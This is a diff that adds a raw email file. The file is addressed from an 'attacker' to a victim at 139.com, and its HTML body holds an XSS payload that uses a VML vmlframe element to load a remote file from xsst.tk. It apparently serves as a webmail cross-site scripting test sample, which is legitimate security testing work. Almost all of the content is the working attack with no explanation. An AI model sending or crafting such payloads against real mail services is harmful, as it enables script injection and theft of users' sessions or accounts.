@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: Test
+To: victim@139.com
+MIME-Version: 1.0
+Content-type: text/html
+
+XSS<vmlframe xmlns="url:schemas-microsoft-com:vml" style="behavior:url(#default#vml);position:absolute;width:100%;height:100%" src="http://xsst.tk/mail.vml#xss"></vmlframe>
